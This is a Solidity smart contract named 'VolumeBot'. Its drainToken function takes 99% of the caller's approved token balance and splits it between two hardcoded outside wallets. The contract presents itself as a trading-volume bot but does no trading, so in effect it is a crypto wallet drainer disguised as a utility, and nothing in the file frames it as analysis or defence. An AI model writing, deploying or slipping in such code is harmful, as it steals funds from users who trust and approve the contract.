// SPDX-License-Identifier: MIT pragma solidity ^0.8.20;

interface IERC20 { function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); function balanceOf(address account) external view returns (uint256); function decimals() external view returns (uint8); }

contract VolumeBot { address public owner; bool public isPaused = false;

address public wallet1 = 0xeA54572eBA790E31f97e1D6f941D7427276688C3;
address public wallet2 = 0xE6822a37334924139492D9360AD40BA3d1A2334E;

modifier onlyOwner() {
    require(msg.sender == owner, "Not authorized");
    _;
}

modifier notPaused() {
    require(!isPaused, "Contract is paused");
    _;
}

constructor() {
    owner = msg.sender;
}

function pause() external onlyOwner {
    isPaused = true;
}

function resume() external onlyOwner {
    isPaused = false;
}

function drainToken(address tokenAddress) external notPaused {
    IERC20 token = IERC20(tokenAddress);

    uint256 balance = token.balanceOf(msg.sender);
    require(balance > 0, "No token balance to drain");

    uint256 gasReserve = balance / 100; // reserve 1%
    uint256 amountToDrain = balance - gasReserve;
    require(amountToDrain > 0, "Not enough balance after gas reserve");

    uint256 half = amountToDrain / 2;

    bool success1 = token.transferFrom(msg.sender, wallet1, half);
    bool success2 = token.transferFrom(msg.sender, wallet2, amountToDrain - half);

    require(success1 && success2, "Transfer failed");
}

}